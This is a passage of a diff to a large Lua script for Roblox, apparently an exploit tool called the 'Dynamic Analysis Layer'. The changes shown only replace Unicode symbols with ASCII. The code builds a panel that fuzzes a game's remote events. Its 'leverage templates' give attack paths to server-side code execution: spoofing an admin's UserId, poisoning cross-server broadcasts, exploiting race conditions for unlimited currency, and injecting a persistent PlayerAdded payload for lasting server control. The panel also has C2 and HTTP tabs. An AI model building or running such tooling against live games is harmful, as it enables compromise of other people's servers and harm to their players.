     end)
 
     scanAllBtn.MouseButton1Click:Connect(function()
-        scanAllBtn.Text = "RUNNING…"
+        scanAllBtn.Text = "RUNNING..."
         -- Pre-scan first, then full fuzz
         task.spawn(function()
             LE:scanAndResolveAll()
@@ -11836,11 +11836,11 @@ local function buildPanel(parentGui)
     uiCorner(root, 8)
     local rootStroke = uiStroke(root, COL.BORDER, 0.35, 1)
 
-    -- ── Header ───────────────────────────────────────────────────
+    -- -- Header ---------------------------------------------------
     local hdr = mkFrame(root, 0, 0, PANEL_W, 32, COL.HDR, 0.08, 51)
     uiCorner(hdr, 8)
     mkLabel(hdr, 12, 0, PANEL_W - 120, 32,
-        "⬡  DYNAMIC ANALYSIS LAYER", 10, COL.TEXT,
+        "[DAL]  DYNAMIC ANALYSIS LAYER", 10, COL.TEXT,
         Enum.TextXAlignment.Left, 52)
 
     -- Mode toggle button
@@ -11849,12 +11849,12 @@ local function buildPanel(parentGui)
         [2] = { bg = Color3.fromRGB(180,  40, 200), text = Color3.fromRGB(255, 160, 255) },
     }
     local modeBtn = mkBtn(hdr, PANEL_W - 90, 7, 82, 18,
-        "● MODE 1",
+        "* MODE 1",
         modeColors[1].bg, modeColors[1].text, 52)
     modeBtn.MouseButton1Click:Connect(function()
         DAL.mode = DAL.mode == 1 and 2 or 1
         local mc = modeColors[DAL.mode]
-        modeBtn.Text           = "● MODE " .. DAL.mode
+        modeBtn.Text           = "* MODE " .. DAL.mode
         modeBtn.BackgroundColor3 = mc.bg
         modeBtn.TextColor3       = mc.text
         uiStroke(modeBtn, mc.bg, 0.55, 1)
@@ -11864,7 +11864,7 @@ local function buildPanel(parentGui)
         TweenService:Create(rootStroke, TweenInfo.new(0.30), { Color = mc.bg }):Play()
     end)
 
-    -- ── Stats dashboard + critical alert banner ────────────────────
+    -- -- Stats dashboard + critical alert banner --------------------
     -- Live counters and a flashing top banner. This is the piece that
     -- makes the panel feel like it's actively watching instead of
     -- just listing things.
@@ -11872,7 +11872,7 @@ local function buildPanel(parentGui)
     local triggerAlert = buildAlertBanner(root, PANEL_W)
     local STATS_H = 34
 
-    -- ── Tab bar ──────────────────────────────────────────────────
+    -- -- Tab bar --------------------------------------------------
     local TAB_H  = 26
     local tabBar = mkFrame(root, 0, 32 + STATS_H, PANEL_W, TAB_H, Color3.fromRGB(12, 14, 24), 0.15, 51)
     local CONTENT_Y = 32 + STATS_H + TAB_H
@@ -11931,24 +11931,24 @@ local function buildPanel(parentGui)
     local PW = PANEL_W        -- shorthand
     local PH = PANEL_H - CONTENT_Y
 
-    -- ════════════════════════════════════════════════════════════
-    --   TAB CONTENT — built by dedicated functions (see above)
+    -- ============================================================
+    --   TAB CONTENT -- built by dedicated functions (see above)
     --   Each tab gets its own 200-register budget instead of
     --   sharing one with buildPanel and the other three tabs.
-    -- ════════════════════════════════════════════════════════════
+    -- ============================================================
     local rebuildRemoteList = buildRemotesTab(pages[1], PW, PH, switchTab)
     local rebuildViolations = buildViolationsTab(pages[2], PW, PH)
     buildFuzzerTab(pages[3], PW, PH, rebuildViolations)
     buildC2LogTab(pages[4], PW, PH)
     buildLeverageTab(pages[5], PW, PH, switchTab)
 
-    -- ── Wire discovery → remote list + live stats ──────────────────
+    -- -- Wire discovery -> remote list + live stats ------------------
     DAL.onDiscovery = function()
         rebuildRemoteList()
         updateStats()
     end
 
-    -- ── Wire violations → live stats + critical alert banner ───────
+    -- -- Wire violations -> live stats + critical alert banner -------
     -- buildViolationsTab already chained itself onto DAL.onViolation
     -- (to call rebuildViolations). Chain onto THAT here so the stats
     -- bar and alert banner update on every single violation too.
@@ -11965,7 +11965,7 @@ local function buildPanel(parentGui)
 
     return root
 end
--- ══════════════════════════════════════════════════════════════════
+-- ==================================================================
 --   LEVERAGE ENGINE
 --   The core of DAL's purpose: takes a confirmed violation and
 --   answers three questions:
@@ -11984,13 +11984,13 @@ end
 --     confidence  : string  -- "Confirmed" | "Probable" | "Structural"
 --     steps       : table   -- ordered list of strings: the attack path
 --   }
--- ══════════════════════════════════════════════════════════════════
+-- ==================================================================
 
--- ── Leverage templates keyed by VTYPE ────────────────────────────
+-- -- Leverage templates keyed by VTYPE ----------------------------
 local LEVERAGE_TEMPLATES = {}
 
 LEVERAGE_TEMPLATES[VTYPE.STATE_SPOOF] = {
-    headline   = "Server silently processed malformed data — trust boundary is absent.",
+    headline   = "Server silently processed malformed data -- trust boundary is absent.",
     mechanism  = "The server received a payload that violated its expected type contract "
               .. "and continued executing instead of rejecting it. This means no guard "
               .. "clause exists at this boundary.",
@@ -12003,21 +12003,21 @@ LEVERAGE_TEMPLATES[VTYPE.STATE_SPOOF] = {
     confidence = "Confirmed",
     steps = {
         "Client sends malformed payload (NaN / math.huge / wrong type).",
-        "Server receives value — no type assertion fires.",
+        "Server receives value -- no type assertion fires.",
         "Value propagates to downstream handler unchecked.",
         "If handler passes value to require() / loadstring() / Instance.new():",
-        "  → Attacker controls the instruction, not just the data.",
-        "  → SB-RCE achieved.",
+        "  -> Attacker controls the instruction, not just the data.",
+        "  -> SB-RCE achieved.",
     },
 }
 
 LEVERAGE_TEMPLATES[VTYPE.SILENT_PROCESS] = {
-    headline   = "Server consumed the probe silently — no rejection, no error.",
+    headline   = "Server consumed the probe silently -- no rejection, no error.",
     mechanism  = "A malformed payload reached the server and was processed without "
               .. "triggering a visible error. This indicates the server has no input "
               .. "validation at this boundary and will accept arbitrary data shapes.",
     rceVector  = "Silent acceptance is the precondition for every higher-class attack. "
-              .. "Run an RCE boundary probe on this remote immediately — if the server "
+              .. "Run an RCE boundary probe on this remote immediately -- if the server "
               .. "treats strings as instructions anywhere in its handler chain, this "
               .. "boundary is your entry point for execution injection.",
     nodeTypeId = "REMOTE",
@@ -12025,14 +12025,14 @@ LEVERAGE_TEMPLATES[VTYPE.SILENT_PROCESS] = {
     confidence = "Confirmed",
     steps = {
         "Client sends malformed payload.",
-        "Server processes silently — no guard exists.",
+        "Server processes silently -- no guard exists.",
         "Attacker escalates payload type toward code strings.",
         "If server evaluates string payload: SB-RCE entry point confirmed.",
     },
 }
 
 LEVERAGE_TEMPLATES[VTYPE.IDENTITY_LOSS] = {
-    headline   = "Server lost track of who made this request — identity can be spoofed.",
+    headline   = "Server lost track of who made this request -- identity can be spoofed.",
     mechanism  = "The RemoteEvent securely prepends the Player object as the first "
               .. "argument. However, when this remote hands off to a BindableEvent or "
               .. "module, the Player reference is dropped. Downstream systems use a "
@@ -12040,24 +12040,24 @@ LEVERAGE_TEMPLATES[VTYPE.IDENTITY_LOSS] = {
     rceVector  = "Inject a target UserId (e.g. a server admin or developer) as the "
               .. "identity argument. If the downstream handler grants elevated access "
               .. "based on that spoofed identity, you gain admin-level execution context "
-              .. "without breaking the sandbox — and from that context, admin commands "
+              .. "without breaking the sandbox -- and from that context, admin commands "
               .. "may load or execute arbitrary scripts.",
     nodeTypeId = "BINDABLE",
     nodeAction = "BindableEvent",
     confidence = "Confirmed",
     steps = {
-        "Client fires RemoteEvent — engine guarantees Player as arg[1].",
+        "Client fires RemoteEvent -- engine guarantees Player as arg[1].",
         "Server handler receives Player correctly.",
         "Handler fires BindableEvent WITHOUT passing Player forward.",
         "Downstream module reads UserId from payload instead of engine.",
         "Attacker supplies UserId of admin/developer.",
         "Downstream system grants elevated permissions to attacker.",
-        "With elevated context: admin commands may invoke loadstring() → SB-RCE.",
+        "With elevated context: admin commands may invoke loadstring() -> SB-RCE.",
     },
 }
 
 LEVERAGE_TEMPLATES[VTYPE.BROADCAST_POISON] = {
-    headline   = "Client can force a payload into fleet-wide broadcast — one injection, all servers.",
+    headline   = "Client can force a payload into fleet-wide broadcast -- one injection, all servers.",
     mechanism  = "A RemoteEvent on this client feeds data into a MessagingService "
               .. "PublishAsync call without sanitizing the payload first. Because "
               .. "MessagingService is treated as a trusted inter-server channel, "
@@ -12071,17 +12071,17 @@ LEVERAGE_TEMPLATES[VTYPE.BROADCAST_POISON] = {
     nodeAction = "MessagingService",
     confidence = "Structural",
     steps = {
-        "Identify the RemoteEvent → PublishAsync ingress path (double ingress).",
+        "Identify the RemoteEvent -> PublishAsync ingress path (double ingress).",
         "Craft malformed payload targeting the receiving server's handler.",
         "Fire the ingress remote once from one client.",
         "MessagingService broadcasts poisoned data to ALL active servers.",
-        "Receiving servers process payload as trusted — no re-validation.",
+        "Receiving servers process payload as trusted -- no re-validation.",
         "If payload reaches loadstring / require / Instance.new: fleet-wide SB-RCE.",
     },
 }
 
 LEVERAGE_TEMPLATES[VTYPE.RACE_PRECOND] = {
-    headline   = "No concurrency guard — rapid fire passes balance checks before commit.",
+    headline   = "No concurrency guard -- rapid fire passes balance checks before commit.",
     mechanism  = "This remote handles an economy or state-change action without a "
               .. "debounce, mutex, or transaction wrapper. Multiple simultaneous "
               .. "requests can each pass the 'do they have enough?' check before "
@@ -12089,7 +12089,7 @@ LEVERAGE_TEMPLATES[VTYPE.RACE_PRECOND] = {
     rceVector  = "While not a direct RCE vector, race conditions on economy remotes "
               .. "can grant unlimited resources. Unlimited resources unlock premium "
               .. "features that may call require() or loadstring() with attacker- "
-              .. "influenced arguments — creating an indirect path to SB-RCE.",
+              .. "influenced arguments -- creating an indirect path to SB-RCE.",
     nodeTypeId = "SERVICE",
     nodeAction = "DataStoreService",
     confidence = "Structural",
@@ -12103,7 +12103,7 @@ LEVERAGE_TEMPLATES[VTYPE.RACE_PRECOND] = {
 }
 
 LEVERAGE_TEMPLATES[VTYPE.DOUBLE_INGRESS] = {
-    headline   = "Remote feeds MessagingService — this is the fleet-broadcast fuse.",
+    headline   = "Remote feeds MessagingService -- this is the fleet-broadcast fuse.",
     mechanism  = "This remote's name matches patterns associated with cross-server "
               .. "broadcast. If it routes to MessagingService:PublishAsync(), a single "
               .. "poisoned client payload will be replicated to every active server "
@@ -12125,7 +12125,7 @@ LEVERAGE_TEMPLATES[VTYPE.DOUBLE_INGRESS] = {
 }
 
 LEVERAGE_TEMPLATES[VTYPE.LOGIC_BYPASS] = {
-    headline   = "Server performs a trust-based decision — assumption can be violated.",
+    headline   = "Server performs a trust-based decision -- assumption can be violated.",
     mechanism  = "The server is making a decision based on what the client is expected "
               .. "to send, rather than what the server can prove. The developer assumed "
               .. "a constraint (range, type, context) that the client is never actually "
@@ -12143,12 +12143,12 @@ LEVERAGE_TEMPLATES[VTYPE.LOGIC_BYPASS] = {
         "Confirm the server executes the downstream logic without validation.",
         "Map which state changes result from the bypass.",
         "Trace whether any state change reaches a code execution sink.",
-        "If yes: logic bypass → state manipulation → SB-RCE.",
+        "If yes: logic bypass -> state manipulation -> SB-RCE.",
     },
 }
 
 LEVERAGE_TEMPLATES[VTYPE.RCE_BOUNDARY] = {
-    headline   = "EXECUTION BOUNDARY CONFIRMED — server treated attacker string as code.",
+    headline   = "EXECUTION BOUNDARY CONFIRMED -- server treated attacker string as code.",
     mechanism  = "The server received a string probe and echoed back an execution "
               .. "signature, OR the remote's handler passes string arguments into "
               .. "loadstring(), require(), getfenv(), or a custom interpreter. "
@@ -12156,29 +12156,29 @@ LEVERAGE_TEMPLATES[VTYPE.RCE_BOUNDARY] = {
     rceVector  = "SB-RCE IS ACHIEVABLE FROM THIS REMOTE. Next steps: "
               .. "(1) Confirm execution environment via getfenv() probe. "
               .. "(2) Enumerate accessible globals (DataStoreService, Players, etc). "
-              .. "(3) Inject persistent payload — a function that fires on every "
-              .. "PlayerAdded event — to maintain persistent server-side control.",
+              .. "(3) Inject persistent payload -- a function that fires on every "
+              .. "PlayerAdded event -- to maintain persistent server-side control.",
     nodeTypeId = "REQUIRE",
     nodeAction = "External Asset ID",
     confidence = "Confirmed",
     steps = {
-        "Execution boundary confirmed — string was interpreted as code.",
+        "Execution boundary confirmed -- string was interpreted as code.",
         "Probe execution environment: getfenv() / getgc() enumeration.",
         "Map accessible globals: DataStore, Players, ServerStorage.",
         "Craft persistent payload (PlayerAdded hook).",
         "Inject payload through confirmed execution sink.",
-        "SB-RCE ACHIEVED — persistent server-side control established.",
+        "SB-RCE ACHIEVED -- persistent server-side control established.",
     },
 }
 
--- ── Core leverage function ────────────────────────────────────────
+-- -- Core leverage function ----------------------------------------
 function DAL:buildLeverageReport(violation)
     local template = LEVERAGE_TEMPLATES[violation.vtype]
 
     -- Fallback for unknown violation types
     if not template then
         return {
-            headline   = "Vulnerability class logged — manual analysis required.",
+            headline   = "Vulnerability class logged -- manual analysis required.",
             mechanism  = "No leverage template exists for: " .. tostring(violation.vtype),
             rceVector  = "Review the violation evidence manually and cross-reference "
                       .. "with known attack patterns for this remote.",
@@ -12219,7 +12219,7 @@ function DAL:buildLeverageReport(violation)
     return report
 end
 
--- ── Apply to Node: pushes a leverage report into the S->S graph ──
+-- -- Apply to Node: pushes a leverage report into the S->S graph --
 function DAL:applyToNode(report)
     -- Find the matching NODE_TYPE entry
     local targetTypeData = nil
@@ -12264,7 +12264,7 @@ function DAL:applyToNode(report)
     for _, action in ipairs(targetTypeData.actions or {}) do
         if action.n == report.nodeAction then
             newNode.selectedAction = action
-            newNode.actionLbl.Text = action.n .. " — " .. action.d
+            newNode.actionLbl.Text = action.n .. " -- " .. action.d
             break
         end
     end
@@ -12280,13 +12280,13 @@ function DAL:applyToNode(report)
         sev      = report.severity and report.severity.label or "?",
         path     = report.remotePath,
         evidence = "Node spawned: " .. report.nodeTypeId ..
-                   " ← " .. report.vtype,
+                   " <- " .. report.vtype,
     })
 
     return true, newNode
 end
 
--- ── Leverage cache: violations → reports (computed lazily) ────────
+-- -- Leverage cache: violations -> reports (computed lazily) --------
 DAL.leverageCache = {}
 
 function DAL:getLeverageReport(violation)
@@ -12303,7 +12303,7 @@ function DAL:clearViolations()
     self.leverageCache = {}
 end
 
--- ══════════════════════════════════════════════════════════════════
+-- ==================================================================
 --   LEVERAGE PANEL
 --   A floating overlay that appears when the user clicks a
 --   violation row. Shows the full LeverageReport for that violation:
@@ -12313,7 +12313,7 @@ end
 --     - RCE vector (how to reach SB-RCE)
 --     - [APPLY TO NODE] button
 --     - [FUZZ AGAIN] button (re-runs probes on same remote)
--- ══════════════════════════════════════════════════════════════════
+-- ==================================================================
 local leveragePanel = nil   -- singleton, shown/hidden per violation
 
 local function closeLeveragePanel()
@@ -12358,13 +12358,13 @@ local function showLeveragePanel(parentGui, violation, report)
         Enum.TextXAlignment.Left, 82)
 
     -- Close button
-    local closeBtn = mkBtn(hdr, PW - 34, 8, 20, 20, "✕",
+    local closeBtn = mkBtn(hdr, PW - 34, 8, 20, 20, "x",
         Color3.fromRGB(228,60,80), Color3.fromRGB(228,60,80), 82)
     closeBtn.MouseButton1Click:Connect(closeLeveragePanel)
 
     -- Remote path label
     mkLabel(LP, 8, 38, PW - 16, 14,
-        "⟶ " .. report.remotePath, 7, COL.DIM,
+        "-> " .. report.remotePath, 7, COL.DIM,
         Enum.TextXAlignment.Left, 81)
 
     -- Scroll area for the full report
@@ -12375,7 +12375,7 @@ local function showLeveragePanel(parentGui, violation, report)
             Color3.new(0,0,0), 1, 82)
         tRow.LayoutOrder = #scroll:GetChildren()
         mkLabel(tRow, 0, 0, PW - 18, 18,
-            "▸ " .. title, 8, titleCol or report.severity.col,
+            "> " .. title, 8, titleCol or report.severity.col,
             Enum.TextXAlignment.Left, 83)
 
         local bodyLines = {}
@@ -12412,7 +12412,7 @@ local function showLeveragePanel(parentGui, violation, report)
         Color3.new(0,0,0), 1, 82)
     stepTitle.LayoutOrder = #scroll:GetChildren()
     mkLabel(stepTitle, 0, 0, PW - 18, 18,
-        "▸ ATTACK PATH → SB-RCE", 8, Color3.fromRGB(90,180,255),
+        "> ATTACK PATH -> SB-RCE", 8, Color3.fromRGB(90,180,255),
         Enum.TextXAlignment.Left, 83)
 
     for i, step in ipairs(report.steps) do
@@ -12442,47 +12442,47 @@ local function showLeveragePanel(parentGui, violation, report)
     -- Action buttons
     local btnY = PH - 56
 
-    -- [APPLY TO NODE] — the centrepiece
+    -- [APPLY TO NODE] -- the centrepiece
     local applyBtn = mkBtn(LP, 8, btnY, PW - 120, 40,
-        "⬡  APPLY TO NODE  →  S→S GRAPH",
+        "[DAL]  APPLY TO NODE  ->  S->S GRAPH",
         Color3.fromRGB(200,40,220), Color3.fromRGB(200,40,220), 82)
     applyBtn.TextSize = 9
 
     applyBtn.MouseButton1Click:Connect(function()
-        applyBtn.Text = "Spawning node…"
+        applyBtn.Text = "Spawning node..."
         local ok, result = DAL:applyToNode(report)
         if ok then
-            applyBtn.Text = "✓ Node added to S→S"
+            applyBtn.Text = "[OK] Node added to S->S"
             applyBtn.BackgroundColor3 = Color3.fromRGB(40, 160, 80)
             task.delay(1.5, closeLeveragePanel)
         else
-            applyBtn.Text = "✗ " .. tostring(result)
+            applyBtn.Text = "[X] " .. tostring(result)
             applyBtn.BackgroundColor3 = Color3.fromRGB(180, 40, 40)
         end
     end)
 
-    -- [FUZZ AGAIN] — re-runs probes on the same remote
+    -- [FUZZ AGAIN] -- re-runs probes on the same remote
     local fuzzBtn = mkBtn(LP, PW - 108, btnY, 100, 40,
-        "⟳  FUZZ AGAIN",
+        "<>  FUZZ AGAIN",
         Color3.fromRGB(220,175,50), Color3.fromRGB(220,175,50), 82)
     fuzzBtn.TextSize = 8
 
     fuzzBtn.MouseButton1Click:Connect(function()
-        fuzzBtn.Text = "Running…"
+        fuzzBtn.Text = "Running..."
         DAL:fuzzRemote(report.remotePath, nil, function()
-            fuzzBtn.Text = "⟳  FUZZ AGAIN"
+            fuzzBtn.Text = "<>  FUZZ AGAIN"
         end)
     end)
 
     return LP
 end
 
--- ── Wire leverage panel into the violations tab ───────────────────
--- Called by buildViolationsTab — injects "LEVERAGE ▸" button on
+-- -- Wire leverage panel into the violations tab -------------------
+-- Called by buildViolationsTab -- injects "LEVERAGE >" button on
 -- each violation row that opens the leverage panel on click.
 function DAL:attachLeverageToRow(row, violation, parentGui)
     local PW = row.AbsoluteSize.X > 0 and row.AbsoluteSize.X or 500
-    local leverageBtn = mkBtn(row, PW - 130, 5, 80, 18, "LEVERAGE ▸",
+    local leverageBtn = mkBtn(row, PW - 130, 5, 80, 18, "LEVERAGE >",
         Color3.fromRGB(200,40,220), Color3.fromRGB(200,40,220), 55)
 
     local captV = violation
@@ -12494,12 +12494,12 @@ function DAL:attachLeverageToRow(row, violation, parentGui)
     return leverageBtn
 end
 
--- ══════════════════════════════════════════════════════════════════
+-- ==================================================================
 --   INITIALIZATION
 --   Call DAL:init(parentFrame, x, y) to spawn the panel and start
 --   the background crawler. Integrates with existing TransparentGui
 --   by passing the ContentArea or any ScreenGui frame as parent.
--- ══════════════════════════════════════════════════════════════════
+-- ==================================================================
 function DAL:init(parent)
     self.panel = buildPanel(parent)
     self:startCrawlLoop()
@@ -12510,13 +12510,13 @@ end
 end)()
 
 
--- ════════════════════════════════════════════════════════════════════
+-- ====================================================================
 --   DAL LAUNCH
 --   Mounts the Dynamic Analysis Layer into its own dedicated "DAL" tab
 --   page (captured earlier as DALPage), so it no longer overlaps the
 --   S->S, HPDC, Console, C2, or HTTP tabs. Starts the background
 --   crawler loop immediately.
--- ════════════════════════════════════════════════════════════════════
+-- ====================================================================
 DAL:init(DALPage)
 
 
